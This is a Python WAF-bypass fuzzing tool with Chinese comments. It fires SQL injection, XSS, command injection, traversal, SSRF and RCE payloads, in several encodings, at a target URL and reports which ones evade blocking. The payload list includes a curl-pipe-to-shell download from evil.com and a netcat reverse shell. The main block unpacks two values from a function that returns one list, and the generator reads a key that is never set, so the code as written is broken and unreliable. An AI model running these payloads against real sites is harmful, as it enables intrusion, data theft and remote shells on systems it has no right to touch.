import requests
import urllib.parse
import time

# 1. 定义常见的攻击payload
PAYLOADS = [
    # SQL注入
    "' OR '1'='1",
    "' OR 1=1 --",
    "'; EXEC xp_cmdshell('whoami'); --",
    "'; WAITFOR DELAY '0:0:5'--",
    "admin' --",
    "\" OR \"1\"=\"1\" --",
    "' UNION SELECT NULL--",
    "' AND 1=2 UNION SELECT 1,username,password FROM users--",
    # XSS
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "'\"><iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    # 命令注入
    "cat /etc/passwd",
    "id;whoami",
    "`id`",
    "$(id)",
    "| whoami",
    "& whoami",
    "; ls",
    # 目录遍历
    "../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "../" * 10 + "etc/passwd",
    # SSRF
    "http://127.0.0.1:80/",
    "http://localhost/admin",
    "file:///etc/passwd",
    # RCE
    "; curl http://evil.com/shell.sh | sh",
    "| nc -e /bin/sh evil.com 4444",
    # 其他
    "<!--#exec cmd=\"ls\"-->",
    "<math><mtext></mtext><svg><script>alert(1)</script>",
    "<details open ontoggle=alert(1)>"
]

# 2. 定义绕过编码/变形方式
def encode_payload(payload):
    encodings = []
    # 原始
    encodings.append(('raw', payload))
    # URL 编码
    encodings.append(('urlencode', urllib.parse.quote(payload)))
    # 双重URL编码
    encodings.append(('double_urlencode', urllib.parse.quote(urllib.parse.quote(payload))))
    # HTML 实体编码
    encodings.append(('html_escape', payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#39;')))
    # Unicode 编码
    encodings.append(('unicode', ''.join(['\\u{:04x}'.format(ord(c)) for c in payload])))
    # 大小写变换
    encodings.append(('swapcase', payload.swapcase()))
    # 插入注释
    encodings.append(('inline_comment', payload.replace(" ", "/**/")))
    # 十六进制
    encodings.append(('hex', ''.join(['\\x{:02x}'.format(ord(c)) for c in payload])))
    # Base64
    import base64
    encodings.append(('base64', base64.b64encode(payload.encode()).decode()))
    return encodings

# 3. 检测WAF响应
def is_blocked(response):
    waf_keywords = ['waf', 'firewall', 'forbidden', 'blocked', 'deny']
    return any(kw in response.text.lower() for kw in waf_keywords) or response.status_code in (403, 406, 501)

# 4. FUZZ 流程
def fuzz_waf(target_url, param='q'):
    result_matrix = []
    for payload in PAYLOADS:
        for encode_type, encoded in encode_payload(payload):
            params = {param: encoded}
            try:
                resp = requests.get(target_url, params=params, timeout=5)
            except Exception as e:
                status = f"请求错误: {e}"
                blocked = None
            else:
                blocked = is_blocked(resp)
                status = "被拦截" if blocked else "成功通过"
            print(f"Payload: {payload} | 编码: {encode_type} | 结果: {status}")
            result_matrix.append({
                "payload": payload,
                "encode_type": encode_type,
                "encoded": encoded,
                "result": status
            })
            time.sleep(0.2)
    return result_matrix

# 5. 自动生成绕过脚本
def generate_bypass_script(bypass_list):
    lines = [
        "#!/usr/bin/env python3",
        "# 自动生成的WAF绕过payload编码脚本",
        "import urllib.parse",
        "",
        "def encode_payload(payload, encode_type):",
        "    if encode_type == 'urlencode':",
        "        return urllib.parse.quote(payload)",
        "    elif encode_type == 'double_urlencode':",
        "        return urllib.parse.quote(urllib.parse.quote(payload))",
        "    elif encode_type == 'swapcase':",
        "        return payload.swapcase()",
        "    elif encode_type == 'inline_comment':",
        "        return payload.replace(' ', '/**/')",
        "    else:",
        "        return payload",
        "",
        "if __name__ == '__main__':",
        "    payloads = ["
    ]
    for item in bypass_list:
        lines.append(f"        ('{item['payload']}', '{item['encode']}'),")
    lines += [
        "    ]",
        "    for payload, encode_type in payloads:",
        "        encoded = encode_payload(payload, encode_type)",
        "        print(f'[{encode_type}] {payload} => {encoded}')"
    ]
    return "\n".join(lines)

if __name__ == '__main__':
    target = input("请输入WAF测试目标URL (如 http://127.0.0.1/test?q=): ").strip()
    param = input("请输入参数名(如q, search, id): ").strip() or 'q'
    bypass_list, vuln_list = fuzz_waf(target, param)
    print("\n=== 可用绕过编码列表 ===")
    for item in bypass_list:
        print(item)
    # 生成绕过编码脚本
    script = generate_bypass_script(bypass_list)
    with open('waf_bypass_script.py', 'w', encoding='utf-8') as f:
        f.write(script)
    print("绕过payload编码脚本已生成：waf_bypass_script.py")
    if vuln_list:
        print("\n=== 直接未被WAF拦截的payload ===")
        for p in vuln_list:
            print(p)